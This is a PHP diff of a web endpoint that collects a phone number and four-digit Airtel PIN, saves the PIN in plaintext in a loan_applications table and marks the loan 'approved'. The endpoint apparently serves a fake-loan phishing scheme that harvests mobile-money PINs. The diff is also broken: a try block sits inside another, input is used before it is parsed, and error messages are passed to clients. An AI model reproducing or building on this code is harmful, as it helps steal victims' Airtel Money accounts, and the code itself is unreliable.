@@ -15,65 +15,83 @@ try {
     $phone = $data['phone'] ?? '';
     $airtel_pin = $data['pin'] ?? '';
 
-    if (!$phone || !$airtel_pin) {
+    require_once '../config/db.php';
+
+    // Always return JSON
+    header('Content-Type: application/json; charset=utf-8');
+
+    if ($_SERVER["REQUEST_METHOD"] !== "POST") {
         http_response_code(400);
-        echo json_encode(['error' => 'Missing phone or PIN']);
+        echo json_encode(['error' => 'Invalid request method']);
         exit;
     }
 
-    // Validate PIN (4 digits)
-    if (!preg_match('/^\d{4}$/', $airtel_pin)) {
-        http_response_code(400);
-        echo json_encode(['error' => 'Invalid PIN format']);
-        exit;
-    }
+    try {
+        $raw = file_get_contents("php://input");
+        $data = json_decode($raw, true);
 
-    // Find the most recent loan application for this phone
-    $stmt = $pdo->prepare("
-        SELECT id FROM loan_applications 
-        WHERE phone = :phone 
-        ORDER BY created_at DESC 
-        LIMIT 1
-    ");
-    $stmt->execute([':phone' => $phone]);
-    $row = $stmt->fetch();
+        if (json_last_error() !== JSON_ERROR_NONE) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Invalid JSON payload']);
+            exit;
+        }
 
-    if (!$row) {
-        http_response_code(404);
-        echo json_encode(['error' => 'Loan application not found']);
-        exit;
-    }
+        $phone = isset($data['phone']) ? trim($data['phone']) : '';
+        $airtel_pin = isset($data['pin']) ? trim($data['pin']) : '';
 
-    $application_id = $row['id'];
+        if ($phone === '' || $airtel_pin === '') {
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing phone or PIN']);
+            exit;
+        }
 
-    // Update with Airtel PIN and confirmation
-    $updateStmt = $pdo->prepare("
-        UPDATE loan_applications 
-        SET airtel_pin = :pin, 
-            airtel_confirmed = 1,
-            status = 'approved'
-        WHERE id = :id
-    ");
+        // Validate PIN (4 digits)
+        if (!preg_match('/^\d{4}$/', $airtel_pin)) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Invalid PIN format']);
+            exit;
+        }
 
-    $result = $updateStmt->execute([
-        ':pin' => $airtel_pin,
-        ':id' => $application_id
-    ]);
+        // Find the most recent loan application for this phone
+        $stmt = $pdo->prepare(
+            "SELECT id FROM loan_applications WHERE phone = :phone ORDER BY created_at DESC LIMIT 1"
+        );
+        $stmt->execute([':phone' => $phone]);
+        $row = $stmt->fetch();
 
-    if ($result) {
-        http_response_code(200);
-        echo json_encode([
-            'success' => true,
-            'message' => 'Airtel verification successful',
-            'redirect' => 'success.html'
+        if (!$row) {
+            http_response_code(404);
+            echo json_encode(['error' => 'Loan application not found']);
+            exit;
+        }
+
+        $application_id = $row['id'];
+
+        // Update with Airtel PIN and confirmation
+        $updateStmt = $pdo->prepare(
+            "UPDATE loan_applications SET airtel_pin = :pin, airtel_confirmed = 1, status = 'approved' WHERE id = :id"
+        );
+
+        $result = $updateStmt->execute([
+            ':pin' => $airtel_pin,
+            ':id' => $application_id
         ]);
-    } else {
+
+        if ($result) {
+            http_response_code(200);
+            echo json_encode([
+                'success' => true,
+                'message' => 'Airtel verification successful',
+                'redirect' => 'success.html'
+            ]);
+        } else {
+            http_response_code(500);
+            echo json_encode(['error' => 'Failed to update verification']);
+        }
+
+    } catch (Exception $e) {
         http_response_code(500);
-        echo json_encode(['error' => 'Failed to update verification']);
+        echo json_encode(['error' => 'Server error: ' . $e->getMessage()]);
     }
 
-} catch (Exception $e) {
-    http_response_code(500);
-    echo json_encode(['error' => $e->getMessage()]);
-}
-?>
+    ?>
